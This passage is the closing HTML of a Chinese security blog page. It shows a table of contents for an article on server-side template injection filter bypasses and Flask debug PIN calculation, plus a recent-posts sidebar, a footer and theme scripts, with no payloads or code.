href="#getitem%E7%BB%95%E8%BF%87%E4%B8%AD%E6%8B%AC%E5%8F%B7%E8%BF%87%E6%BB%A4"><span class="toc-number">1.3.3.4.2.</span> <span class="toc-text">getitem绕过中括号过滤</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8D%95%E5%8F%8C%E5%BC%95%E5%8F%B7%E8%BF%87%E6%BB%A4%E5%92%8C%E7%BB%95%E8%BF%87"><span class="toc-number">1.3.3.4.3.</span> <span class="toc-text">单双引号过滤和绕过</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E5%99%A8%E7%BB%95%E8%BF%87%E4%B8%8B%E5%88%92%E7%BA%BF"><span class="toc-number">1.3.3.4.4.</span> <span class="toc-text">过滤器绕过下划线</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%82%B9%E7%9A%84%E8%BF%87%E6%BB%A4%E5%92%8C%E7%BB%95%E8%BF%87"><span class="toc-number">1.3.3.4.5.</span> <span class="toc-text">点的过滤和绕过</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%85%B3%E9%94%AE%E5%AD%97%E7%BB%95%E8%BF%87"><span class="toc-number">1.3.3.4.6.</span> <span class="toc-text">关键字绕过</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%95%B0%E5%AD%97%E8%BF%87%E6%BB%A4"><span class="toc-number">1.3.3.4.7.</span> <span class="toc-text">数字过滤</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96config%E6%96%87%E4%BB%B6"><span class="toc-number">1.3.3.4.8.</span> <span class="toc-text">获取config文件</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B7%B7%E5%90%88%E8%BF%87%E6%BB%A4"><span class="toc-number">1.3.3.4.9.</span> <span class="toc-text">混合过滤</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%97%A0%E5%9B%9E%E7%8E%B0ssti"><span class="toc-number">1.3.3.5.</span> <span class="toc-text">无回现ssti</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#debug-pin%E7%A0%81%E8%AE%A1%E7%AE%97"><span class="toc-number">1.4.</span> <span class="toc-text">debug pin码计算</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/09/18/Python%E4%B8%AD%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC/" title="Python中的内存马">Python中的内存马</a><time datetime="2024-09-17T16:00:00.000Z" title="Created 2024-09-18 00:00:00">2024-09-18</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/06/27/JNDI%20-(%E5%8F%AF%E8%AE%BF%E9%97%AE)JDBC%E3%80%81LDAP%E3%80%81RMI%E3%80%81DNS%E3%80%81NIS%E3%80%81CORBA%E3%80%82/" title="Untitled">Untitled</a><time datetime="2024-06-27T13:08:05.623Z" title="Created 2024-06-27 21:08:05">2024-06-27</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/06/16/http192.168.1.14410003/" title="Untitled">Untitled</a><time datetime="2024-06-16T11:39:32.205Z" title="Created 2024-06-16 19:39:32">2024-06-16</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/06/01/%E7%9F%A9%E9%98%B5%E6%9D%AFwp/" title="Untitled">Untitled</a><time datetime="2024-06-01T06:19:50.358Z" title="Created 2024-06-01 14:19:50">2024-06-01</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/05/26/Docker%20%20PHP%E7%9A%84%E8%A3%B8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" title="Untitled">Untitled</a><time datetime="2024-05-26T08:06:29.598Z" title="Created 2024-05-26 16:06:29">2024-05-26</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By 阿巴</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>